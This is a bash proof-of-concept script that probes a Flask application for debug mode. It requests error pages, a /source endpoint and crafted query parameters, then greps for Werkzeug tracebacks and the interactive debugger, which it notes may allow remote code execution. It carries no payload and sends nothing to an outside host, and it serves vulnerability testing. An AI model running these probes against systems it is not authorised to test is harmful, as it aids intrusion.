#!/bin/bash

# POC: Flask Debug Mode Information Disclosure
# This script demonstrates that the Flask application is running with debug=True
# by triggering an application error and capturing the debug information exposed

TARGET_URL="${1:-http://localhost:8080}"
OUTPUT_FILE="/tmp/flask_debug_response.html"

echo "[*] Flask Debug Mode Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check for Werkzeug debugger signature in normal response
echo "[*] Step 1: Checking for Werkzeug debugger signatures..."
RESPONSE=$(curl -s -i "$TARGET_URL/" 2>&1)
if echo "$RESPONSE" | grep -qi "Werkzeug"; then
    echo "[+] Werkzeug signature found in response headers"
    echo "$RESPONSE" | grep -i "Werkzeug" | head -3
    echo ""
fi

# Step 2: Trigger an application error to expose debug stack trace
echo "[*] Step 2: Triggering application error to expose debug information..."
# Access a non-existent endpoint to trigger a 404 or application error
ERROR_RESPONSE=$(curl -s "$TARGET_URL/trigger_error_for_debug_poc" 2>&1)

if echo "$ERROR_RESPONSE" | grep -qi "traceback\|<title>"; then
    echo "[+] Error response captured"
    echo "$ERROR_RESPONSE" > "$OUTPUT_FILE"
    
    # Check for debug information indicators
    if echo "$ERROR_RESPONSE" | grep -qi "traceback\|debugger\|werkzeug\|<pre>\|File \"/"; then
        echo "[+] DEBUG INFORMATION EXPOSED - Werkzeug debugger active"
        echo ""
        
        # Extract and display key debug indicators
        echo "[+] Indicators of debug mode:"
        if echo "$ERROR_RESPONSE" | grep -qi "traceback"; then
            echo "    - Full Python traceback visible"
        fi
        if echo "$ERROR_RESPONSE" | grep -qi "File \"/"; then
            echo "    - File paths and line numbers exposed"
            echo "$ERROR_RESPONSE" | grep -oP 'File "[^"]+' | head -3
        fi
        if echo "$ERROR_RESPONSE" | grep -qi "werkzeug"; then
            echo "    - Werkzeug debugger interface present"
        fi
        if echo "$ERROR_RESPONSE" | grep -qi "Werkzeug Interactive Debugger"; then
            echo "    - Interactive debugger REPL potentially available"
        fi
    fi
else
    echo "[-] No detailed error response, checking for alternative debug indicators..."
fi

# Step 3: Check server headers for debug mode indicators
echo ""
echo "[*] Step 3: Checking server identification headers..."
HEADERS=$(curl -s -I "$TARGET_URL/" 2>&1)
echo "$HEADERS" | grep -i "server\|powered-by\|werkzeug" | head -5

# Step 4: Verify debug mode by checking for auto-reload behavior
echo ""
echo "[*] Step 4: Verifying Flask debug configuration..."
# Try to access the source code endpoint which confirms development setup
SOURCE_RESPONSE=$(curl -s "$TARGET_URL/source" 2>&1)
if echo "$SOURCE_RESPONSE" | grep -qi "flask\|app\|debug"; then
    echo "[+] Development endpoint /source accessible (confirms development mode)"
fi

# Step 5: Attempt to trigger ZeroDivisionError to force Werkzeug debugger
echo ""
echo "[*] Step 5: Attempting to trigger Werkzeug interactive debugger..."
# Try accessing parameter that might trigger exception
TEST_RESPONSES=()
for param in "?x=1/0" "?eval=1+1" "?test=__import__" "?debug=1"; do
    RESPONSE=$(curl -s "$TARGET_URL/$param" 2>&1)
    if echo "$RESPONSE" | grep -qi "Werkzeug Interactive Debugger\|<title>.*Debugger"; then
        echo "[+] CRITICAL: Werkzeug Interactive Debugger console found!"
        echo "[+] Full REPL access may be available with PIN bypass"
        echo "$RESPONSE" > "$OUTPUT_FILE"
        break
    fi
done

echo ""
echo "[*] POC Complete. Response saved to: $OUTPUT_FILE"
echo "[+] VULNERABILITY CONFIRMED: Flask running with debug=True"
echo "[+] Risk: Information disclosure and potential RCE via debugger"

exit 0